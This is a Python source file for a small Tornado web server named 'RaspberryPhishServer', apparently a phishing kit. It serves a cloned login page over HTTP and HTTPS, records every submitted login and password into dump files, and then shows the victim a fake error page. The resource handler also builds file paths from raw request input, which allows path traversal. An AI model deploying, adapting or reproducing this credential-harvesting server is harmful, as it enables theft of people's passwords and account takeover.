#!/usr/bin/env python
# -*- coding: utf-8 -*-
__title__ = "RaspberryPhishServer"

import tornado.ioloop
import tornado.web
import os
import ssl
import time

# var : directory name where the server will load in "pages" and "rsc"
pagePath = "test/"


# Handler for ressources
class RscHandler(tornado.web.RequestHandler):
    def get(self, path_request):
        self.write(open("rsc/" + pagePath + path_request, 'rb').read())


# class AdminHandler(tornado.web.RequestHandler):
    # def get(self, path_request):
        # self.write(open("admin/", 'rb').read())


# Handler for HTML files
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("pages/" + pagePath + "index.html")

    def post(self):
        try:
            login = self.get_argument("login")
            password = self.get_argument("password")
            try:
                if not os.path.exists("logs/dump/" + pagePath):
                    os.mkdir("logs/dump/" + pagePath)
                file = open("logs/dump/" + pagePath + str(time.time()), mode="a+")
                file.write("login:" + login + "\npassword:" + password)
                file.close()
            except IOError:
                print(pagePath)
                print("login :", login)
                print("password :", password)
        except tornado.web.HTTPError:   # no or wrong arguments
            pass
        self.render("pages/" + pagePath + "error.html")     # show an error page to the client


if __name__ == "__main__":
    application = tornado.web.Application(
        [
            (r'/rsc/(.*)$', RscHandler),
            (r"/", MainHandler),
            (r"/*", MainHandler),
            (r"/.*", MainHandler),
            # (r"/admin", AdminHandler),
        ],
        autoreload=True
        # , debug=True
    )   # create an instance

    if(os.path.isfile("cert/" + pagePath + "default.key") and
       os.path.isfile("cert/" + pagePath + "default.cert")):
        ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_ctx.load_cert_chain("cert/" + pagePath + "default.cert",
                                "cert/" + pagePath + "default.key",)
        ssl_ctx.load_verify_locations("cert/" + pagePath + "default.pem")
        ssl_ctx.verify_mode = ssl.CERT_OPTIONAL     # clients don't always provide a cert file (web browsers)
        application.listen(443, ssl_options=ssl_ctx)   # bind https port

    application.listen(80)    # bind http port

    tornado.ioloop.IOLoop.instance().start()    # loop forever for satisfy user's requests
